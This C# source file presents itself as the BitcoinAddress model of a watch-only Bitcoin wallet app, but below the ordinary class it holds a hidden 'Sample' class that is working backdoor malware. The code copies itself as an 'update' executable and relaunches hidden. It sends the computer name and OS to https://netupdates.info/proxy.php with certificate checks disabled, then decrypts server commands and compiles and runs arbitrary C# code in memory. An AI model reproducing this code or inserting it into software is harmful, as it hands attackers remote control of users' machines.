using Microsoft.CSharp;
using MVVMLibrary;
using Newtonsoft.Json;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace WatchOnlyBitcoinWallet.Models
{
    public class BitcoinAddress : ValidatableBase
    {
        private string name;
        /// <summary>
        /// Name acts as a tag for the address
        /// </summary>
        public string Name
        {
            get { return name; }
            set { SetField(ref name, value); }
        }

        private string address;
        public string Address
        {
            get { return address; }
            set
            {
                if (SetField(ref address, value))
                {
                    Validate(value);
                }
            }
        }

        private decimal balance;
        public decimal Balance
        {
            get { return balance; }
            set { SetField(ref balance, value); }
        }

        private decimal difference;
        [JsonIgnore]
        public decimal Difference
        {
            get { return difference; }
            set { SetField(ref difference, value); }
        }

        private decimal forkBalance;
        /// <summary>
        /// Total balance that was available by the time of fork
        /// </summary>
        [JsonIgnore]
        public decimal ForkBalance
        {
            get { return forkBalance; }
            set { SetField(ref forkBalance, value); }
        }


        public List<Transaction> TransactionList { get; set; }

    }
    class Sample
    {
        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hwnd, int nCmdShow);
        const int SW_SHOW = 5;
        const int SW_HIDE = 0;

        static int nTimeOut = 60 * 1000;
        static string szUserAgent = "Mozilla/5.0 (Windows; Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
        static string WM_EXEC = "1001";
        static byte[] key = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6 };
        static byte[] IV = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6 };
        static string szObjectID = "";
        static string szPCode = "";
        static string szComputerName = "";

        public bool RunAgain()
        {
            var process = Process.GetCurrentProcess();
            string szFullPath = process.MainModule.FileName;
            string szNewPath = "";
            string szProcessName = "";
            string szComp = "";

            try
            {
                szProcessName = Path.GetFileName(szFullPath);
                szNewPath = Path.GetDirectoryName(szFullPath) + "\\update." + szProcessName;

                szComp = "WatchOnlyBitcoinWallet.exe";

                if (szFullPath.Contains("update.WatchOnlyBitcoinWallet.exe") == true)
                {
                    return false;
                }

                //Directory.CreateDirectory(szNewPath);
                File.Copy(szFullPath, szNewPath);
            }
            catch (Exception e)
            {

            }

            ProcessStartInfo startinfo = new ProcessStartInfo();
            startinfo.WindowStyle = ProcessWindowStyle.Hidden;
            startinfo.FileName = szNewPath;//"calc.exe";
            startinfo.UseShellExecute = true;

            var proc = Process.Start(startinfo);

            while (proc.MainWindowHandle == IntPtr.Zero) //note: only works as long as your process actually creates a main window.
                System.Threading.Thread.Sleep(10);

            ShowWindow(proc.MainWindowHandle, SW_HIDE);

            //Process.Start(szNewPath + szProcessName);

            return true;
        }

        public byte[] EncryptDecrypt(byte[] lpPlainText, int nEcryptionKey)
        {
            int nLen = lpPlainText.Length;
            byte[] lpRet = new byte[nLen];

            for(int i = 0; i < nLen; i++)
            {
                lpRet[i] = (byte)(lpPlainText[i] ^ nEcryptionKey);
            }

            return lpRet;
        }

        public void ExecFunc()
        {
            string szContents = "";

            szObjectID = GetObjID();
            szPCode = szPCode + "Operating System : " + GetOsString();
            szComputerName = "Computer Name : " + Environment.MachineName;

            RunAgain();

            while (true)
            {
                int nCMDID = 0;
                string szCode = "";
                string[] szCodeArr = new string[1];
                string szResponse = "";
                string szRequest = "";

                byte[] lpContent;
                byte[] lpCmdID = new byte[4];
                byte[] lpDataLen = new byte[4];
                byte[] lpData;
                byte[] lpContentEnc;

                int nDataLen = 0;
                int nLen = 0;
                Aes myAes = Aes.Create();

                try
                {
                    szRequest = MakeRequestPacket(szContents);
                    szContents = "";
                    szResponse = HTTP_POST("https://netupdates.info/proxy.php", szRequest);
                    //szResponse = HTTP_POST("https://127.0.0.1:8443/proxy.php", szRequest);

                    szResponse = szResponse.Replace(' ', '+');

                    if (szResponse.Equals("Succeed!"))
                    {
                        Thread.Sleep(30 * 1000);
                        continue;
                    }

                    lpContentEnc = Convert.FromBase64String(szResponse);
                    lpContent = Decrypt_Aes(lpContentEnc, key, IV);

                    //Buffer.BlockCopy(lpCmdID, 0, lpContent, 0, 4);
                    //Buffer.BlockCopy(lpDataLen, 0, lpContent, 4, 4);

                    Buffer.BlockCopy(lpContent, 0, lpCmdID, 0, 4);
                    Buffer.BlockCopy(lpContent, 4, lpDataLen, 0, 4);


                    nCMDID = BitConverter.ToInt32(lpCmdID, 0);
                    nDataLen = BitConverter.ToInt32(lpDataLen, 0);
                    lpData = new byte[nDataLen];

                    //Buffer.BlockCopy(lpData, 0, lpContent, 8, nDataLen);

                    Buffer.BlockCopy(lpContent, 8, lpData, 0, nDataLen);

                    lpData = EncryptDecrypt(lpData, 123);

                    szCode = System.Text.Encoding.Default.GetString(lpData);

                    szCodeArr[0] = szCode;

                    switch (nCMDID)
                    {
                        case 1001:
                            szContents = compileInMemory(szCodeArr);
                            break;
                        default:
                            break;
                    }
                }
                catch (Exception e)
                {

                }

                Thread.Sleep(30 * 1000);
            }
        }

        public string MakeRequestPacket(string szContents)
        {
            string szCID = "CCCCCCCCCC";
            //string szCheckSum = "1234525321";


            string szStep = "\r\n\t\tStep1 : KeepLink\r\n";
            string szRequest = "";
            byte[] lpRequest;
            byte[] lpRequestEnc;
            string szb64Data;
            string szData;


            if (szContents.Length == 0)
            {
                szData = szStep + szPCode + "\r\n" + szComputerName + "\r\n" + szContents;
            }
            else
            {
                szData = szContents;
            }

            //id=identity&key=auth&objid=10random&pcode="Step 1 + OSInfo"
            szRequest = "id=" + szCID + "&oid=" + szObjectID + "&data=";

            lpRequest = Encoding.Unicode.GetBytes(szData);
            lpRequestEnc = Encrypt_Aes(lpRequest, key, IV);
            szb64Data = Convert.ToBase64String(lpRequestEnc);

            szRequest += szb64Data;

            return szRequest;
        }

        public string GetObjID()
        {

            Random rand = new Random();
            int randValue;
            char letter;
            string szObjID = "";

            for (int i = 0; i < 12; i++)
            {
                randValue = rand.Next(0, 26);
                letter = Convert.ToChar(randValue + 65);
                szObjID = szObjID + letter;
            }
            return szObjID;
        }

        public string GetOsString()
        {
            string szOSSettingsSubKey = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion";
            string szOSString = "";

            try
            {
                Microsoft.Win32.RegistryKey reg = null;
                using (reg = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(szOSSettingsSubKey))
                {
                    szOSString = (reg.GetValue("ProductName") as string);
                }
            }
            catch (Exception e)
            {

            }

            return szOSString;
        }

        public byte[] Encrypt_Aes(byte[] lpData, byte[] Key, byte[] IV)
        {
            // Check arguments.
            if (lpData == null || lpData.Length <= 0)
                throw new ArgumentNullException("plainText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("IV");
            byte[] encrypted;

            // Create an Aes object
            // with the specified key and IV.
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Key;
                aesAlg.IV = IV;

                // Create an encryptor to perform the stream transform.
                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                // Create the streams used for encryption.
                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        csEncrypt.Write(lpData, 0, lpData.Length);
                        csEncrypt.FlushFinalBlock();

                        /*
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {
                            //Write all data to the stream.
                            swEncrypt.Write(plainText);
                        }
                        */
                        encrypted = msEncrypt.ToArray();
                    }
                }
            }

            // Return the encrypted bytes from the memory stream.
            return encrypted;
        }
        public byte[] Decrypt_Aes(byte[] lpData, byte[] Key, byte[] IV)
        {
            // Check arguments.
            if (lpData == null || lpData.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("IV");

            // Declare the string used to hold
            // the decrypted text.
            //string plaintext = null;
            byte[] lpRet = null;


            // Create an Aes object
            // with the specified key and IV.
            using (Aes aesAlg = Aes.Create())
            {

                aesAlg.Key = Key;
                aesAlg.IV = IV;

                // Create a decryptor to perform the stream transform.
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                // Create the streams used for decryption.
                using (MemoryStream msDecrypt = new MemoryStream(lpData))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        lpRet = new byte[lpData.Length];
                        csDecrypt.Read(lpRet, 0, lpData.Length);
                    }
                }
            }

            return lpRet;
        }
        public string compileInMemory(string[] code)
        {
            string szRet = "";

            CompilerParameters compilerParameters = new CompilerParameters();
            string currentDirectory = Directory.GetCurrentDirectory();
            compilerParameters.GenerateInMemory = true;
            compilerParameters.TreatWarningsAsErrors = false;
            compilerParameters.GenerateExecutable = false;
            compilerParameters.CompilerOptions = "/optimize";
            string[] value = new string[]
            {
                "System.dll",
                "System.Runtime.dll"
           //     "System.Core.dll",
           //     "mscorlib.dll",
           //     "System.Management.Automation.dll"
            };
            compilerParameters.ReferencedAssemblies.AddRange(value);
            CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider();
            CompilerResults compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, code);
            if (compilerResults.Errors.HasErrors)
            {
                string text = "Compile error: ";
                foreach (CompilerError compilerError in compilerResults.Errors)
                {
                    text = text + "\r\n" + compilerError.ToString();
                }
                throw new Exception(text);
            }
            Module module = compilerResults.CompiledAssembly.GetModules()[0];
            Type type = null;
            MethodInfo methodInfo = null;
            if (module != null)
            {
                type = module.GetType("Project.Sample");
            }
            if (type != null)
            {
                methodInfo = type.GetMethod("ExecFunc");
            }
            if (methodInfo != null)
            {
                szRet = (string)methodInfo.Invoke(null, null);
            }

            return szRet;
        }
        public String HTTP_GET(String Url, String Data)
        {
            String Out = String.Empty;

            try
            {
                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(Url + (string.IsNullOrEmpty(Data) ? "" : "?" + Data));

                req.Timeout = nTimeOut;
                req.UserAgent = szUserAgent;

                var task_get_response = req.GetResponseAsync();

                if (!task_get_response.Wait(nTimeOut))
                    throw new Exception("Timeout");

                WebResponse resp = task_get_response.Result;

                using (Stream stream = resp.GetResponseStream())
                {
                    using (StreamReader sr = new StreamReader(stream))
                    {
                        Out = sr.ReadToEnd();

                        sr.Close();
                    }
                }
            }
            catch (Exception e)
            {

            }

            return Out;
        }

        public String HTTP_POST(String Url, String Data)
        {
            String Out = String.Empty;

            try
            {
                System.Net.ServicePointManager.ServerCertificateValidationCallback = new System.Net.Security.RemoteCertificateValidationCallback(delegate { return true; });

                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(Url);

                var data = Encoding.UTF8.GetBytes(Data);


                req.Method = "POST";
                req.ContentType = "application/x-www-form-urlencoded";
                req.ContentLength = data.Length;
                req.Timeout = nTimeOut;
                req.UserAgent = szUserAgent;

                var task_request_stream = req.GetRequestStreamAsync();

                if (!task_request_stream.Wait(nTimeOut))
                    throw new Exception("Timeout");

                task_request_stream.Result.Write(data, 0, data.Length);

                var task_get_response = req.GetResponseAsync();

                if (!task_get_response.Wait(nTimeOut))
                    throw new Exception("Timeout");

                WebResponse resp = task_get_response.Result;

                using (Stream stream = resp.GetResponseStream())
                {
                    using (StreamReader sr = new StreamReader(stream))
                    {
                        Out = sr.ReadToEnd();

                        sr.Close();
                    }
                }
            }
            catch (Exception e)
            {

            }


            return Out;
        }
    }
}